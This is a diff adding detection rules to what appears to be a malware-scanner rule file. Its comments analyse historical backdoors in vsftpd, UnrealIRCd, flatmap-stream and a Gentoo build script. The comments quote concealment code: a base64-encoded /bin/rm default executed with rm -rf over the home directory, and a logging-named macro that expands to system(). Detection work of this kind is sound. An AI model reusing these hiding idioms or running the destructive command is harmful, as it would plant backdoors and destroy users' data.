@@ -100,6 +100,60 @@ traits:
       type: text
       regex: 'define\s*\(\s*[''"]\w{1,32}[''"]\s*,\s*[''"][^''"\n]{0,40}[''"]\s*\)'
 
+  - id: indexed-byte-hex-compare
+    desc: Buffer byte compared to hex value
+    crit: component
+    conf: 0.85
+    for: [c, cpp, text]
+    if:
+      type: text
+      regex: '\[\s*\w{1,6}\s*\]\s*==\s*0x[0-9a-fA-F]{2}'
+
+  - id: next-byte-hex-compare
+    desc: Next byte compared to hex value
+    crit: notable
+    conf: 0.85
+    for: [c, cpp, text]
+    # `p_buf[i+1] == 0x29`. Two adjacent bytes tested against fixed values is
+    # a signature check, not parsing.
+    if:
+      type: text
+      regex: '\[\s*\w{1,6}\s*\+\s*1\s*\]\s*==\s*0x[0-9a-fA-F]{2}'
+
+  - id: character-class-helper-call
+    desc: Calls a character-class helper
+    crit: component
+    conf: 0.85
+    for: [c, cpp, text]
+    if:
+      type: text
+      # No leading \b: projects wrap these as `vsf_sysutil_isspace`, and an
+      # underscore is a word character, so a boundary anchor never matches the
+      # wrapped form -- which is the form that actually appears.
+      regex: 'is(space|alpha|digit)\w{0,4}\s*\('
+
+  - id: base64-decoded-command-default
+    desc: Command name decoded from base64
+    crit: notable
+    conf: 0.93
+    for: [shell, makefile, text]
+    # `meson=${meson:-`base64 -d <<< L2Jpbi9ybQo=`}`. The `:-` default idiom
+    # is ordinary shell; what is being defaulted is not. A build script names
+    # its tools in plain text -- there is no portability or escaping reason to
+    # encode `/bin/rm`, only a reading reason.
+    if:
+      type: text
+      regex: '\$\{[A-Za-z_]\w{0,20}:-[^}]{0,30}base64\s+-d'
+
+  - id: exec-of-variable-command
+    desc: Execs a command held in a variable
+    crit: component
+    conf: 0.85
+    for: [shell, makefile, text]
+    if:
+      type: text
+      regex: '\bexec\s+"?\$\{?[A-Za-z_]\w{0,20}'
+
 composite_rules:
   - id: execution-sink-named-as-sanitiser
     desc: Exec sink named as a data sanitiser
@@ -192,3 +246,108 @@ composite_rules:
       - id: constant-defined-from-literal
     unless:
       - id: metadata/package/testing/
+
+  - id: magic-byte-trigger-in-character-scanner
+    desc: Magic byte test inside a character scanner
+    crit: hostile
+    conf: 0.95
+    for: [c, cpp, text]
+    near_lines: 8
+    # vsftpd 2.3.4. The command-and-control rules state that a magic byte
+    # sequence dispatches a bind shell. This states where the attacker put
+    # the test: inside `str_contains_space()`, a helper whose entire job is
+    # deciding whether a string has whitespace in it. The loop calls
+    # `vsf_sysutil_isspace()` on each byte, and the injected lines sit in the
+    # `else` arm looking for 0x3a 0x29 -- a smiley.
+    #
+    # Nobody audits a whitespace helper. That is the whole reason it is there,
+    # and it is a different fact from the trigger existing: it tells a reviewer
+    # the author chose a function where the addition would read as parsing,
+    # and it generalises to any signature check smuggled into a byte loop
+    # whose stated purpose is character classification.
+    all:
+      - id: indexed-byte-hex-compare
+      - id: next-byte-hex-compare
+      - id: character-class-helper-call
+    unless:
+      - id: metadata/package/testing/
+
+  - id: build-execs-base64-hidden-command
+    desc: Build execs a base64-hidden command
+    crit: hostile
+    conf: 0.95
+    for: [shell, makefile, text]
+    near_lines: 40
+    # The Gentoo `configure` wrapper of the 2018 GitHub-organisation
+    # compromise. Its last line is
+    #
+    #   exec ${meson} -rf build "${args[@]}" $HOME ~/
+    #
+    # which reads as handing the build over to meson. `${meson}` was defaulted
+    # at the top of the file to a base64 blob decoding to `/bin/rm`, so the
+    # line actually runs `rm -rf` across the invoking user's home directory.
+    #
+    # The impact rules state what it destroys. This states why nobody caught
+    # it while reading: every token on the executing line is plausible, and
+    # the one that is not is defined twenty lines earlier in an idiom that
+    # exists to look unremarkable. Encoding a *command name* -- as opposed to
+    # data -- has no benign purpose in a build script.
+    all:
+      - id: base64-decoded-command-default
+      - id: exec-of-variable-command
+    unless:
+      - id: metadata/package/testing/
+
+  - id: payload-hidden-in-test-fixture
+    desc: Test fixture carries an executable payload
+    crit: hostile
+    conf: 0.95
+    for: [javascript, typescript]
+    # flatmap-stream, the dependency slipped into event-stream, kept its
+    # payload in `test/data.js`. The supply-chain rules describe the loader
+    # that decrypts and compiles it. This describes where it was parked.
+    #
+    # A test directory is the one place in a package that reviewers, linters
+    # and publish-time checks all skip by design, and where a large opaque
+    # blob is unremarkable -- fixtures are supposed to be inert data. That is
+    # the whole reason to put a cipher payload there rather than beside the
+    # code that loads it. sendmail 8.12.6 used the same hiding place twenty
+    # years earlier for the same reason, which is why this is stated as its
+    # own technique rather than folded into whichever loader happens to
+    # collect it.
+    #
+    # The test-path traits are used as positive evidence here. They are the
+    # finding, not a reason to suppress one -- the opposite of the
+    # directory-wide `unless:` mistake documented on the sibling stego rule.
+    all:
+      - id: metadata/package/testing/presence/harness::test-directory-path
+      - id: micro-behaviors/data/encode/payload::large-encoded-blob-literal
+    any:
+      - id: micro-behaviors/crypto/symmetric/aes/runtime-library::create-decipher-hex-hidden
+      - id: micro-behaviors/process/interpreter/eval/compile::module-compile-hex-hidden
+
+  - id: logging-named-macro-runs-commands
+    desc: Debug-named macro expands to system
+    crit: hostile
+    conf: 0.95
+    for: [c, cpp, text]
+    # UnrealIRCd 3.2.8.1. The backdoor is three preprocessor lines added to
+    # `include/struct.h`, and the load-bearing one is:
+    #
+    #   #define DEBUG3_DOLOG_SYSTEM(x) system(x)
+    #
+    # Every use of it is written `DEBUG3_LOG(x)`, so the call sites read as
+    # logging. The name is not merely innocuous, it is drawn from the
+    # project's own debug vocabulary and defined among its real DEBUGMODE
+    # macros, which is why the addition survived review and shipped for seven
+    # months.
+    #
+    # The dispatch rules describe the trigger -- a magic "AB" prefix on an
+    # inbound line. This describes the concealment, and it is the half that
+    # generalises: any macro that promises to log and delivers execution puts
+    # a `system()` behind a name a reader will skip.
+    all:
+      - id: micro-behaviors/process/create/shell/native::c-debug-system-macro-wrapper
+    any:
+      - id: objectives/command-and-control/backdoor/dispatch/shell::debug-macro-system-wrapper
+      - id: objectives/command-and-control/backdoor/dispatch/shell::source-tree-debug-macro-command-trigger
